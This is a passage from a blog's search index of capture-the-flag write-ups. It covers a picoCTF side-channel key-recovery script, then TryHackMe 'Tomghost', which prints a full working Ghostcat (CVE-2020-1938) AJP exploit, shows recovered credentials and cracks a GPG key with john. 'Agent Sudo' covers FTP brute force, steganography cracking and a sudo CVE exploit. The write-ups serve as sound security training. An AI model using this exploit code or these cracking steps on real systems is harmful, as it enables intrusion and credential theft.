    "content": "A. The problemDescriptionThis encryption algorithm leaks a “bit” of data every time it does a computation. Use this to figure out the encryption key. Download the encryption program here . Access the running server with nc saturn.picoctf.net . The flag will be of the format picoCTF{} where  is 32 lowercase hex characters comprising the 16-byte encryption key being used by the program.Hints  The “encryption” algorithm is simple and the correlation between the leakage and the key can be very easily modeled.B. ResolutionTo encrypt a string B = b1b2b3...b16 using the key K = k1k2k3...k16, each plaintext byte is xored with the corresponding key byte, the result C = B xor K = c1c2c3...c16 is used as a set of indexes, each one map to an element of Sbox, the number of elements that have 1 as the least significant bit is returned.Now we denote by Sbox1 (respectively Sbox0) the list of indices of elements of Sbox whose least significant bit is 1 (respectively 0).\\For a given i, if Sbox[ci] has a 0 then necessarily ki xor bi is in the set Sbox0.How is this helpful in figuring out K?If we fix all the bytes of B but one (let it be bi) and iterate over all possibilities of that byte, we’ll be able to tell for which values of bi the encryption ci led to an index from which set of indices. For each iteration, we’ll end up with a set of acceptable values of ki, and by the end, their intersection should lead to a unique index pointing to the element of Sbox that is exactly ki.Our script:#!/usr/bin/env python3import osSbox = (    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,)PORT = &lt;port&gt;Sbox0 = [i for i in range(256) if Sbox[i] &amp; 0x01 == 0]Sbox1 = [i for i in range(256) if Sbox[i] &amp; 0x01 == 1]def api_call(plain):    response = os.popen(f\"echo {plain} | nc saturn.picoctf.net {PORT}\").read();    return int(response.split()[-1])key = []for i in range(16):    # fixing bytes we don't care about so that they don't influence the leakage    right = \"00\" * i    left = \"00\" * (16 - i - 1)    # leaks returned by the server, maxl and minl are used to determine which plaintext    # values are related to which array (Sbox0 or Sbox1)    # note that maxl - minl = 1    leaks = []    maxl = 0    minl = 0    acceptable_keys = set(Sbox)    for byte in range(256):        plain = right + (\"0\" if (byte &lt;= 15) else \"\") + hex(byte)[2:] + left        leak = api_call(plain)        # we start processing once we know the difference between values leaking 1s        # and values leaking 0s        if maxl == minl:            leaks.append(api_call(plain))            maxl = max(leaks)            minl = min(leaks)        else:            if leak == maxl: acceptable_keys = acceptable_keys &amp; set([i ^ byte for i in Sbox1])            else: acceptable_keys = acceptable_keys &amp; set([i ^ byte for i in Sbox0])            if len(acceptable_keys) == 1: break    key.append(hex(acceptable_keys.pop()))print(key)"
  },
  
  {
    "title": "Tomghost",
    "url": "/posts/tomghost/",
    "categories": "CTF Writeups, Try Hack Me",
    "tags": "GPG, Ghostcat, john",
    "date": "2024-02-21 00:00:00 +0100",
    





    
    "snippet": "First, machine scanning$ sudo nmap -sV -sC $IP -Pn -n --disable-arp-ping&lt;...snip...&gt;PORT     STATE SERVICE    VERSION22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; p...",
    "content": "First, machine scanning$ sudo nmap -sV -sC $IP -Pn -n --disable-arp-ping&lt;...snip...&gt;PORT     STATE SERVICE    VERSION22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)53/tcp   open  tcpwrapped8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)| ajp-methods: |_  Supported methods: GET HEAD POST OPTIONS8080/tcp open  http       Apache Tomcat 9.0.30|_http-favicon: Apache Tomcat|_http-title: Apache Tomcat/9.0.30Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOn port 8080 running an Apache Tomcat 9 web server. Navigating there, we found the default page aftersetup of the server. Additionaly, ajp13 is exposed on port 8009 which, after some research about thetwo services, might expose a vulnerability named Ghostcat  Ghostcat is a LFI vulnerability, but somewhat restricted: only files from a certain path can be pulled.Still, this can include files like WEB-INF/web.xml which can leak important information like credentialsfor the Tomcat interface, depending on the server setup.CVE of the vulnerability: CVE-2020-1938.A potential exploit: from ExploitDB.I tried using the exploit directly and found some (small) issues so here is the edited version:#!/usr/bin/env python3#CNVD-2020-10487  Tomcat-Ajp lfi#by ydhcuiimport struct# Some references:# https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.htmldef pack_string(s):\tif s is None:\t\treturn struct.pack(\"&gt;h\", -1)\tl = len(s)\treturn struct.pack(\"&gt;H%dsb\" % l, l, s.encode('utf8'), 0)def unpack(stream, fmt):\tsize = struct.calcsize(fmt)\tbuf = stream.read(size)\treturn struct.unpack(fmt, buf)def unpack_string(stream):\tsize, = unpack(stream, \"&gt;h\")\tif size == -1: # null string\t\treturn None\tres, = unpack(stream, \"%ds\" % size)\tstream.read(1) # \\0\treturn resclass NotFoundException(Exception):\tpassclass AjpBodyRequest(object):\t# server == web server, container == servlet\tSERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)\tMAX_REQUEST_LENGTH = 8186\tdef __init__(self, data_stream, data_len, data_direction=None):\t\tself.data_stream = data_stream\t\tself.data_len = data_len\t\tself.data_direction = data_direction\tdef serialize(self):\t\tdata = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)\t\tif len(data) == 0:\t\t\treturn struct.pack(\"&gt;bbH\", 0x12, 0x34, 0x00)\t\telse:\t\t\tres = struct.pack(\"&gt;H\", len(data))\t\t\tres += data\t\tif self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:\t\t\theader = struct.pack(\"&gt;bbH\", 0x12, 0x34, len(res))\t\telse:\t\t\theader = struct.pack(\"&gt;bbH\", 0x41, 0x42, len(res))\t\treturn header + res\tdef send_and_receive(self, socket, stream):\t\twhile True:\t\t\tdata = self.serialize()\t\t\tsocket.send(data)\t\t\tr = AjpResponse.receive(stream)\t\t\twhile r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:\t\t\t\tr = AjpResponse.receive(stream)\t\t\tif r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:\t\t\t\tbreakclass AjpForwardRequest(object):\t_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28)\tREQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE}\t# server == web server, container == servlet\tSERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)\tCOMMON_HEADERS = [\"SC_REQ_ACCEPT\",\t\t\"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\",\t\t\"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\",\t\t\"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\"\t]\tATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"]\tdef __init__(self, data_direction=None):\t\tself.prefix_code = 0x02\t\tself.method = None\t\tself.protocol = None\t\tself.req_uri = None\t\tself.remote_addr = None\t\tself.remote_host = None\t\tself.server_name = None\t\tself.server_port = None\t\tself.is_ssl = None\t\tself.num_headers = None\t\tself.request_headers = None\t\tself.attributes = None\t\tself.data_direction = data_direction\tdef pack_headers(self):\t\tself.num_headers = len(self.request_headers)\t\tres = \"\"\t\tres = struct.pack(\"&gt;h\", self.num_headers)\t\tfor h_name in self.request_headers:\t\t\tif h_name.startswith(\"SC_REQ\"):\t\t\t\tcode = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1\t\t\t\tres += struct.pack(\"BB\", 0xA0, code)\t\t\telse:\t\t\t\tres += pack_string(h_name)\t\t\tres += pack_string(self.request_headers[h_name])\t\treturn res\tdef pack_attributes(self):\t\tres = b\"\"\t\tfor attr in self.attributes:\t\t\ta_name = attr['name']\t\t\tcode = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1\t\t\tres += struct.pack(\"b\", code)\t\t\tif a_name == \"req_attribute\":\t\t\t\taa_name, a_value = attr['value']\t\t\t\tres += pack_string(aa_name)\t\t\t\tres += pack_string(a_value)\t\t\telse:\t\t\t\tres += pack_string(attr['value'])\t\tres += struct.pack(\"B\", 0xFF)\t\treturn res\tdef serialize(self):\t\tres = \"\"\t\tres = struct.pack(\"bb\", self.prefix_code, self.method)\t\tres += pack_string(self.protocol)\t\tres += pack_string(self.req_uri)\t\tres += pack_string(self.remote_addr)\t\tres += pack_string(self.remote_host)\t\tres += pack_string(self.server_name)\t\tres += struct.pack(\"&gt;h\", self.server_port)\t\tres += struct.pack(\"?\", self.is_ssl)\t\tres += self.pack_headers()\t\tres += self.pack_attributes()\t\tif self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:\t\t\theader = struct.pack(\"&gt;bbh\", 0x12, 0x34, len(res))\t\telse:\t\t\theader = struct.pack(\"&gt;bbh\", 0x41, 0x42, len(res))\t\treturn header + res\tdef parse(self, raw_packet):\t\tstream = StringIO(raw_packet)\t\tself.magic1, self.magic2, data_len = unpack(stream, \"bbH\")\t\tself.prefix_code, self.method = unpack(stream, \"bb\")\t\tself.protocol = unpack_string(stream)\t\tself.req_uri = unpack_string(stream)\t\tself.remote_addr = unpack_string(stream)\t\tself.remote_host = unpack_string(stream)\t\tself.server_name = unpack_string(stream)\t\tself.server_port = unpack(stream, \"&gt;h\")\t\tself.is_ssl = unpack(stream, \"?\")\t\tself.num_headers, = unpack(stream, \"&gt;H\")\t\tself.request_headers = {}\t\tfor i in range(self.num_headers):\t\t\tcode, = unpack(stream, \"&gt;H\")\t\t\tif code &gt; 0xA000:\t\t\t\th_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]\t\t\telse:\t\t\t\th_name = unpack(stream, \"%ds\" % code)\t\t\t\tstream.read(1) # \\0\t\t\th_value = unpack_string(stream)\t\t\tself.request_headers[h_name] = h_value\tdef send_and_receive(self, socket, stream, save_cookies=False):\t\tres = []\t\ti = socket.sendall(self.serialize())\t\tif self.method == AjpForwardRequest.POST:\t\t\treturn res\t\tr = AjpResponse.receive(stream)\t\tassert r.prefix_code == AjpResponse.SEND_HEADERS\t\tres.append(r)\t\tif save_cookies and 'Set-Cookie' in r.response_headers:\t\t\tself.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie']\t\t# read body chunks and end response packets\t\twhile True:\t\t\tr = AjpResponse.receive(stream)\t\t\tres.append(r)\t\t\tif r.prefix_code == AjpResponse.END_RESPONSE:\t\t\t\tbreak\t\t\telif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:\t\t\t\tcontinue\t\t\telse:\t\t\t\traise NotImplementedError\t\t\t\tbreak\t\treturn resclass AjpResponse(object):\t_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)\tCOMMON_SEND_HEADERS = [\t\t\t\"Content-Type\", \"Content-Language\", \"Content-Length\", \"Date\", \"Last-Modified\",\t\t\t\"Location\", \"Set-Cookie\", \"Set-Cookie2\", \"Servlet-Engine\", \"Status\", \"WWW-Authenticate\"\t\t\t]\tdef parse(self, stream):\t\t# read headers\t\tself.magic, self.data_length, self.prefix_code = unpack(stream, \"&gt;HHb\")\t\tif self.prefix_code == AjpResponse.SEND_HEADERS:\t\t\tself.parse_send_headers(stream)\t\telif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:\t\t\tself.parse_send_body_chunk(stream)\t\telif self.prefix_code == AjpResponse.END_RESPONSE:\t\t\tself.parse_end_response(stream)\t\telif self.prefix_code == AjpResponse.GET_BODY_CHUNK:\t\t\tself.parse_get_body_chunk(stream)\t\telse:\t\t\traise NotImplementedError\tdef parse_send_headers(self, stream):\t\tself.http_status_code, = unpack(stream, \"&gt;H\")\t\tself.http_status_msg = unpack_string(stream)\t\tself.num_headers, = unpack(stream, \"&gt;H\")\t\tself.response_headers = {}\t\tfor i in range(self.num_headers):\t\t\tcode, = unpack(stream, \"&gt;H\")\t\t\tif code &lt;= 0xA000: # custom header\t\t\t\th_name, = unpack(stream, \"%ds\" % code)\t\t\t\tstream.read(1) # \\0\t\t\t\th_value = unpack_string(stream)\t\t\telse:\t\t\t\th_name = AjpResponse.COMMON_SEND_HEADERS[code-0xA001]\t\t\t\th_value = unpack_string(stream)\t\t\tself.response_headers[h_name] = h_value\tdef parse_send_body_chunk(self, stream):\t\tself.data_length, = unpack(stream, \"&gt;H\")\t\tself.data = stream.read(self.data_length+1)\tdef parse_end_response(self, stream):\t\tself.reuse, = unpack(stream, \"b\")\tdef parse_get_body_chunk(self, stream):\t\trlen, = unpack(stream, \"&gt;H\")\t\treturn rlen\t@staticmethod\tdef receive(stream):\t\tr = AjpResponse()\t\tr.parse(stream)\t\treturn rimport socketdef prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):\tfr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)\tfr.method = method\tfr.protocol = \"HTTP/1.1\"\tfr.req_uri = req_uri\tfr.remote_addr = target_host\tfr.remote_host = None\tfr.server_name = target_host\tfr.server_port = 80\tfr.request_headers = {\t\t'SC_REQ_ACCEPT': 'text/html',\t\t'SC_REQ_CONNECTION': 'keep-alive',\t\t'SC_REQ_CONTENT_LENGTH': '0',\t\t'SC_REQ_HOST': target_host,\t\t'SC_REQ_USER_AGENT': 'Mozilla',\t\t'Accept-Encoding': 'gzip, deflate, sdch',\t\t'Accept-Language': 'en-US,en;q=0.5',\t\t'Upgrade-Insecure-Requests': '1',\t\t'Cache-Control': 'max-age=0'\t}\tfr.is_ssl = False\tfr.attributes = []\treturn frclass Tomcat(object):\tdef __init__(self, target_host, target_port):\t\tself.target_host = target_host\t\tself.target_port = target_port\t\tself.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\t\tself.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\t\tself.socket.connect((target_host, target_port))\t\tself.stream = self.socket.makefile(\"rb\")\tdef perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]):\t\tself.req_uri = req_uri\t\tself.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))\t\tprint(\"Getting resource at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri))\t\tif user is not None and password is not None:\t\t\tself.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + (\"%s:%s\" % (user, password)).encode('base64').replace('\\n', '')\t\tfor h in headers:\t\t\tself.forward_request.request_headers[h] = headers[h]\t\tfor a in attributes:\t\t\tself.forward_request.attributes.append(a)\t\tresponses = self.forward_request.send_and_receive(self.socket, self.stream)\t\tif len(responses) == 0:\t\t\treturn None, None\t\tsnd_hdrs_res = responses[0]\t\tdata_res = responses[1:-1]\t\tif len(data_res) == 0:\t\t\tprint(\"No data in response. Headers:%s\\n\" % snd_hdrs_res.response_headers)\t\treturn snd_hdrs_res, data_res'''javax.servlet.include.request_urijavax.servlet.include.path_infojavax.servlet.include.servlet_path'''import argparseparser = argparse.ArgumentParser()parser.add_argument(\"target\", type=str, help=\"Hostname or IP to attack\")parser.add_argument('-p', '--port', type=int, default=8009, help=\"AJP port to attack (default is 8009)\")parser.add_argument(\"-f\", '--file', type=str, default='WEB-INF/web.xml', help=\"file path :(WEB-INF/web.xml)\")args = parser.parse_args()t = Tomcat(args.target, args.port)_,data = t.perform_request('/asdf',attributes=[    {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},    {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},    {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},    ])print('----------------------------')print(\"\".join([d.data.decode() for d in data]))Using the exploit to get the default file$ ./ajpexp.py -p 8009 &lt;target_ip&gt;Getting resource at ajp13://&lt;target_ip&gt;:8009/asdf----------------------------&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!--&lt;...snip...&gt;  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;  &lt;description&gt;     Welcome to GhostCat\tskyfu*k:8730281lkjlkjdqlksalks  &lt;/description&gt;&lt;/web-app&gt;Investigating the result, we find a username and a potentially hashed password. Actually, I spendquite a time looking for what kind of hash was that, but I just tried it itself as a password andit worked out connecting to ssh :)In the machine, there exist two users under the home direcotry. The user merlin has theuser.txt flag and we can read it without any further permissions.In the home dictory of skyf_ck, there is two interesting files: tryhackme.asc and credential.pgp.GPG was introduced for email security. Here tryhackme.asc contains a GPG private keyand credential.pgp is potentially some encrypted message containing some credentials.Note: don’t confuse PGP and GPG, they both serve the same purpose.To use the key in the decryption, a passphrase is required. This is what we’re going to brute force using john.$ gpg2john tryhackme.asc &gt; hash   $ john hash -wordlist:/usr/share/wordlists/rockyou.txt&lt;...snip...&gt;Press 'q' or Ctrl-C to abort, almost any other key for statusalexandru        (tryhackme)     1g 0:00:00:00 DONE (2024-02-21 18:41) 16.66g/s 17866p/s 17866c/s 17866C/s marshall..alexandruUse the \"--show\" option to display all of the cracked passwords reliablyThere we have our passphrase. Note that I specified the rockyou wordlist after no match was found inthe default wordlist used by john.To add the private key for decryption we run the following command and enter the passphrase:$ gpg --import tryhackme.ascgpg: key 8F3DA3DEC6707170: \"tryhackme &lt;stuxnet@tryhackme.com&gt;\" not changedgpg: key 8F3DA3DEC6707170: secret key importedgpg: key 8F3DA3DEC6707170: \"tryhackme &lt;stuxnet@tryhackme.com&gt;\" not changedgpg: Total number processed: 2gpg:              unchanged: 2gpg:       secret keys read: 1gpg:   secret keys imported: 1Now for decryption, we’ll be prompted to enter the passphrase once again:$ gpg --decrypt credential.pgpgpg: WARNING: cipher algorithm CAST5 not found in recipient preferencesgpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11      \"tryhackme &lt;stuxnet@tryhackme.com&gt;\"merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123jThe message contains merlin’s credentials. After connection, we discover that the user can executezip with root privilege.merlin@ubuntu:~$ sudo -lMatching Defaults entries for merlin on ubuntu:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser merlin may run the following commands on ubuntu:    (root : root) NOPASSWD: /usr/bin/zipLet’s zip the root folder then. Once done, we’ll send that file to our machine to unzip it without any permissions required.\\merlin@ubuntu:/$ sudo /usr/bin/zip -r zipped root/  adding: root/ (stored 0%)  adding: root/root.txt (stored 0%)  adding: root/.bashrc (deflated 54%)  adding: root/.bash_history (stored 0%)  adding: root/ufw/ (stored 0%)  adding: root/ufw/ufw.sh (stored 0%)  adding: root/.nano/ (stored 0%)  adding: root/.profile (deflated 20%)Found the root flag."
  },
  
  {
    "title": "Agent Sudo",
    "url": "/posts/agent-sudo/",
    "categories": "CTF Writeups, Try Hack Me",
    "tags": "ncrack, john, binwalk, stegseek, HTTP",
    "date": "2024-02-15 00:00:00 +0100",
    





    
    "snippet": "1. EnumerateLet’s start enumerating the machine using nmap:Nmap scan report for &lt;target_ip&gt;Host is up (0.081s latency).Not shown: 997 clFrom,&lt;br&gt;Agent Rosed tcp ports (reset)PORT   STAT...",
    "content": "1. EnumerateLet’s start enumerating the machine using nmap:Nmap scan report for &lt;target_ip&gt;Host is up (0.081s latency).Not shown: 997 clFrom,&lt;br&gt;Agent Rosed tcp ports (reset)PORT   STATE SERVICE VERSION21/tcp open  ftp     vsftpd 3.0.322/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-title: Annoucement|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelInteresting, we have a web server, an FTP server, and an SSH agent.Navigating to the web page, we get the following message  Dear agents,  Use your own codename as user-agent to access the site.  From,Agent RThe message mentions the User-Agent http header. There should be a particular codename that will give us access to more pages in the web app.Back to the hint in the room description, C is the actual user-agent that should be used. We can use many tools to edit the user-agent header; a browser plugin, burpsuite, curl, …Once the request made, we get redirected to /agent_C_attention.php:  Attention chris,  Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!  From,Agent ROur agent’s name is Chris.2. Hash-cracking and brute forceChris’ password is weak as agent J said, so it’s most likely that we would be able to crack it using a standard wordlist attack on the FTP server.We can use different tools to do so, here is the command snippet using ncrack alongside the rockyou wordlist (username.txt contains one entry which is chris):$ ncrack -U username.txt -P /usr/share/wordlists/rockyou.txt ftp://&lt;target_ip&gt; Starting Ncrack 0.7 ( http://ncrack.org ) at 2024-02-15 19:13 UTCStats: 0:00:59 elapsed; 0 services completed (1 total)Rate: 8.70; Found: 1; About 0.00% done(press 'p' to list discovered credentials)Discovered credentials for ftp on &lt;target_ip&gt; 21/tcp:&lt;target_ip&gt; 21/tcp ftp: 'chris' 'crystal'caught SIGINT signal, cleaning upFound the password of chris. Now we can connect to the server and get all the files out there.\\$ ftp chris@&lt;target_ip&gt;Connected to &lt;target_ip&gt;.220 (vsFTPd 3.0.3)331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||45850|)150 Here comes the directory listing.-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png226 Directory send OK.The first interesting file should be the message to agent J:  Dear agent J,  All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn’t be a problem for you.  From,Agent CThe password of J is somewhere in on of the pictures. This technique is called steganography. We can use binwalk to extract (-e) embedded files and executable code:$ binwalk cutie.png   DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced869           0x365           Zlib compressed data, best compression34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt34820         0x8804          End of Zip archive, footer length: 22$ binwalk -e cutie.pngbinwalk creates a folder with all the extracted data. The Zip archive is protected with a password which we can use john to brute force: First, get the hash of the password from the archive using zip2john, and second, launch the brute force attack:$ zip2john 8702.zip &gt; zip.hash$ john zip.hashAfter some time we get the password alien. Note that john used a default wordlist and that we can specify our own wordlist using -wordlist:FILE.Inside the archive, we find the following file To_agentR.txt:  Agent C,  We need to send the picture to ‘QXJlYTUx’ as soon as possible!  By,Agent RNothing interesting but let’s keep the info for the moment.Next, a steg(steganography) password is demanded. There are many tools to do so, again, by brute force. stegseek is one of them.$ stegseek cutie.png /usr/share/wordlists/fasttrack.txt StegSeek 0.6 - https://github.com/RickdeJager/StegSeek[!] error: the file format of the file \"cutie.png\" is not supported.$ stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt  StegSeek 0.6 - https://github.com/RickdeJager/StegSeek[i] Found passphrase: \"Area51\"           [i] Original filename: \"message.txt\".[i] Extracting to \"cute-alien.jpg.out\".In addition to the passphrase, stegseek outputs the embedded file too, in this case message.txt:  Hi james,  Glad you find this message. Your login password is hackerrules!  Don’t ask me why the password look cheesy, ask agent R who set this password for you.  Your buddy,chris3. Capture the user flagNow that we have access to James’ credentials, we can connect to the machine via ssh.Once there, first thing we find is the user flag. Then, another alien picture Alien_autospy.jpg.For those who have no idea about the context, me included, the hint is important. In short, I refer you to the Fox News article entitled “Filmmaker reveals how he faked infamous ‘Roswell alien autopsy’ footage in a London apartment”.4. Privilege escalationWe upload our linPEAS.sh script to the machine to enumerate privilege escalation vulnerabilities.$ scp linPEAS.sh james@&lt;target_ip&gt;:~/james@&lt;target_ip&gt;'s password: linPEAS.sh                                    100%  833KB 802.5KB/s   00:01Now enumerationjames@agent-sudo:~$ chmod +x linPEAS.sh james@agent-sudo:~$ ./linPEAS.sh&lt;...snip...&gt;╔══════════╣ Sudo version╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-versionSudo version 1.8.21p2&lt;...snip...&gt;While scrolling through the output of the script, we notice that the sudo version is marked in red, so we do a little research to find out that a CVE was reported for that specific version. Check out CVE-2019-14287.We take the Python script of the exploit from ExploitDB and run it on the target machine. Hit, got root access.Now we get our root flag in /root/root.txt  To Mr.hacker,  Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.  Your flag is b53a02f55b57d4439e3341834d70c062  By,DesKel a.k.a Agent RMission successful,Agent Sudo."
  },
  
  {
    "title": "Cyborg",
    "url": "/posts/cyborg/",
    "categories": "CTF Writeups, Try Hack Me",
    "tags": "hashcat, borg",
    "date": "2024-02-12 00:00:00 +0100",
    





    
    "snippet": "Nmap scan:$ sudo nmap -sV -sC &lt;target_ip&gt;                         Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-12 15:58 UTCNmap scan report for &lt;target_ip&gt;Host is up (0.077s la...",
